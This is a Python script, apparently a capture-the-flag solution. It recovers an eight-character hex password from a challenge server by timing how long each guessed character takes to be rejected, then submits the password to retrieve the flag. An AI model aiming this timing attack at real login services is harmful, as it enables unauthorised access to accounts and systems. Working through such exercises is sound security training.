import socket
import time

HOST = 'challenge.ctf.games'
PORT = 32316

# Length of the password and possible characters (hexadecimal)
PASSWORD_LEN = 8
CHARS = '0123456789abcdef'
SIMULATE_COMPUTE_TIME = 0.1  # Adjust this based on server response characteristics

def timing_attack():
    password = ''

    # Establish a single connection to use for all guesses
    with socket.create_connection((HOST, PORT)) as conn:
        conn.settimeout(5)
        conn.recv(1024)  # Read introductory message
        
        for i in range(PASSWORD_LEN):
            max_time = 0
            best_char = ''
            
            print(f"Attempting to find character {i + 1} of the password...")
            
            for char in CHARS:
                guess = password + char + '0' * (PASSWORD_LEN - len(password) - 1)
                
                # Measure the time taken to send the guess and receive a response
                start_time = time.time()
                conn.sendall((guess + '\n').encode())
                
                try:
                    response = conn.recv(1024)
                    print(f"Received response: {response.decode().strip()}")
                except socket.timeout:
                    print(f"Timeout for guess: {guess}")
                    continue
                
                elapsed_time = time.time() - start_time
                print(f"Guess '{guess}' took {elapsed_time:.4f} seconds")

                # Track the character with the longest response time
                if elapsed_time > max_time:
                    max_time = elapsed_time
                    best_char = char
                    print(f"New best character for position {i + 1}: '{best_char}' with time {max_time:.4f}s")
                
                # Small delay to avoid overwhelming the server
                #time.sleep(SIMULATE_COMPUTE_TIME)
            
            # Append the best character found for this position
            password += best_char
            print(f"Password so far: {password}")
        
        # Submit the full password to retrieve the flag
        conn.sendall((password + '\n').encode())
        flag = conn.recv(1024)
        print("Final Response (Flag):", flag.decode())

# Execute the attack
timing_attack()
